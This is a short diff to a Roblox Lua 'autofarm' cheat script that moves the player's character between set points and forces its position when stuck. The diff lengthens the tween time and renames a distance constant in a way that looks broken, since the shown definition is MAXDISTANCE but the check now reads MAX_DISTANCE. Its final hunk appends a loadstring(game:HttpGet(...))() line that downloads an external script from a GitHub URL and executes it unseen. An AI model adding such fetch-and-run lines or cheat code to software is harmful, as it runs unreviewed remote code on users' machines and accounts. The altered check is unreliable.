@@ -25,7 +25,7 @@ local points = {
     CFrame.new(25, 272, 181)    -- New intermediate point between 183 and 181
 }
 
-local tweenInfo = TweenInfo.new(0.69, Enum.EasingStyle.Linear)
+local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear)
 
 local MAXDISTANCE = 5  -- Maximum allowed distance from the target point
 local TWEEN_TIMEOUT = 5  -- Timeout for the tween to finish
@@ -57,7 +57,7 @@ local function tweenToPosition(cframe)
 
     -- Check if the character reached the point
     currentPos = humanoidRootPart.Position
-    if (currentPos - adjustedCFrame.Position).magnitude > MAXDISTANCE then
+    if (currentPos - adjustedCFrame.Position).magnitude > MAX_DISTANCE then
         if timeout then
             -- Force position if stuck
             humanoidRootPart.CFrame = adjustedCFrame
@@ -113,3 +113,6 @@ end
 spawn(function()
     resetAutofarmEveryXSeconds(600)
 end)
+
+-- Loading external script from the given link
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HG-Papryka/SuperBombSurvival/refs/heads/main/Script.lua"))()
